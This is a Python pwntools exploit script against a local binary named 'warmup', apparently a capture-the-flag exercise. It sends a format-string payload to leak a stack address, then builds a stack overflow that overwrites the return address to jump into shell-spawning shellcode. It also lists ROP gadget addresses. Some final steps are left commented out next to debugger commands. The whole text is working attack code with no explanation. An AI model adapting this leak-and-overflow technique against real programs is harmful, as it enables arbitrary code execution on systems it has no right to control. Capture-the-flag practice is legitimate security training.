from pwn import *
context.arch = "amd64"
shellcode = asm(shellcraft.sh())
p = process('./warmup')

fmt = b"%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p "

var_offset = 0x100
var_offset_with_rbp = 0x100 + 0x8
get_call = 0x004006db
main_func = 0x004006ba
call_rax = 0x0000000000400538
ret_gadget = 0x000000000040053e
bss_segment = 0x00601060
pop_rdi = 0x0000000000400773
pop_rsi_r15 = 0x0000000000400771
add_cl_cl = 0x0000000000400707

#           payload
payload = fmt + cyclic(var_offset_with_rbp - len(fmt)) + p64(ret_gadget) + p64(main_func)


leak = ''
second_payload = ''

def send_first_payload():
    p.sendline(payload)
    p.recvuntil(b'Please pwn me :)\n')
    line = p.recv()
    print(line)
    return int(line.decode().split(' ')[-1], 16)


def craft_second_payload():
    leak_addr = leak - var_offset
    beginning_part = shellcode
    return beginning_part + cyclic(var_offset_with_rbp - len(beginning_part)) + p64(leak_addr)

# db 0x00400703
# dc
# leak = send_first_payload()
# second_payload = craft_second_payload()
# db 0x004006f9
# dc
# p.sendline(second_payload)

